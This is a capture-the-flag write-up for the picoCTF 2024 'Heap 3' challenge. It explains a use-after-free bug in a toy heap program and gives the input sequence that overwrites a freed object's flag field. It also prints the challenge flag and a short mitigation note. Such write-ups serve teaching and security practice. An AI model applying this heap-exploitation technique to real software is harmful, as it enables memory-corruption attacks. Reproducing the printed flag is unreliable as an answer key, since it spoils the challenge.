## CTF: picoCTF 2024

Challenge: Heap 3

Category: pwn

Points: 10

Difficulty: Intermediate

## Instructions

This program mishandles memory. Can you exploit it to get the flag?

## Solution

This challenge abuses a use-after-free vulnerability.

### Use After Free

The product reuses or references memory after it has been freed. The freed memory may be allocated again and saved in another pointer, while the original pointer references a location within the new allocation. — CWE-416

Looking at the source:

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");
    // Print flag
  }
}

void free_memory() {
    free(x);
}
```

`free_memory` frees x but all other functions still reference it. If we free x, allocate new memory of the same size with our controlled data, it'll land in the same spot. We need 30 bytes to reach the `flag` field (3 x 10-byte fields), then write "pico".

### Exploit

```
Enter your choice: 5         (free x)

Enter your choice: 2         (allocate new object)
Size of object allocation: 35
Data for flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

Enter your choice: 2         (second allocation to consolidate)
Size of object allocation: 4
Data for flag: ss

Enter your choice: 4         (check for win)
YOU WIN!!11!!
academy{now_thats_free_real_estate_95cc82ff}
```

## Flag

```
academy{now_thats_free_real_estate_95cc82ff}
```

## Mitigation

NULL and zero memory after freeing it. Track object malloc and frees to ensure everything lines up.
